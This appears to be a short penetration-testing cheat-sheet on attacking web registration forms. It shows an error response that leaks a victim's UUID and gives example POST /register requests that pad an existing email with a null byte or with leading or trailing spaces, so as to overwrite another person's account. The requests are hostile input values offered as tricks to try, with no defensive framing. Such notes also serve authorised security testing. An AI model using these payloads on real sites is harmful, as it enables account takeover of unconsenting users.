##### Registering with victim's email. The response may leak UUID of victim
````
{"error":"this user already exists", 
"ref":"773u-33f5d-3r5v-353v"}
````
#### Register with existing email so that you may overwrite the existing one. Try these tricks
- Use %00 at the end
  ```
  POST /register
  email=exisitng@gmail.com%00&password=password123
  ```
  - Use space at the end of the email
    ```
      POST /register
  email=exisitng@gmail.com &password=password123
    ```
- Use space at the begining of the email
```
  POST /register
  email= exisitng@gmail.com&password=password123
```
